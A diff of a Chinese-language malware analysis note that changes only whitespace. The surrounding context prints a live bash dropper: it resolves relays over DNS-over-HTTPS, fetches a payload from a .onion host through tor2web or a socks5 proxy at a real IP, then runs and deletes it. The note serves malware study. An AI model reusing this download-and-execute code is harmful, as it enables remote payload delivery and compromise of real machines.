@@ -40,11 +40,9 @@ author: 0e0w
   CgRvlui+rPkiCq7fgarZne3aI54Cz71ugd8nPMnGeugoxg/gRZFBAwgxztGqF7xE
   exec &>/dev/null
   export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
-  
   d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
   c=$(echo "curl -4fsSLkA- -m200")
   t=$(echo "ryukdssuskovhnwb")
-  
   sockz() {
   n=(dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org uncensored.any.dns.nixnet.xyz)
   p=$(echo "dns-query?name=relay.tor2socks.in")
@@ -61,7 +59,6 @@ author: 0e0w
   $c -x socks5h://$s:9050 $t.onion$f -o$x || $c $1$f -o$x
   chmod +x $x;$x;rm -f $x
   }
-  
   for h in tor2web.in tor2web.ch tor2web.io tor2web.to tor2web.su
   do
   if ! ls /proc/$(head -1 /tmp/.X11-unix/00)/status; then
@@ -70,16 +67,15 @@ author: 0e0w
   break
   fi
   done
-  
   ```
   通过程序自带的socks5代理，下载暗网中ryukdssuskovhnwb.onion/int.x86_64文件。
   ```bash
   curl -4fsSLkA- -m200 -x socks5h://165.22.117.234:9050 ryukdssuskovhnwb.onion/int.x86_64 -o./d24e930116b812dc7ca9c410a615fe53
   #www.0e0w.com/zip/d24e930116b812dc7ca9c410a615fe53.7z
   ```
-
+  
   暂时无分析d24e930116b812dc7ca9c410a615fe53的能力与精力。后续待进行。
-
+  
 - 其他的bash
 
   ```bash
@@ -93,8 +89,6 @@ author: 0e0w
   [ -f /tmp/.X11-unix ] && rm -f /tmp/.X11-unix 
   [ -d /tmp/.X11-unix ] || mkdir -p /tmp/.X11-unix
   ```
-
-  
 
 - crontab -l
 
